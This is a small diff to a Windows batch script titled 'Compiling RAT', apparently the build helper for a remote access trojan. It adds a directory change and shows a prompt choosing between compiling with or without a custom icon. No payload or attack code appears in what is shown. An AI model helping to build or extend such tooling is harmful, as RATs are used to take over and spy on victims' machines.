@@ -1,5 +1,7 @@
 @echo off & title Compiling RAT & color 3
 
+cd "%~dp0\src"
+
 choice /c YN /n /m "Do you want a custom icon? (Y or N)"
 if /I "%errorlevel%"=="1" (goto icon_compile) 
 if /I "%errorlevel%"=="2" (goto non_icon_compile)
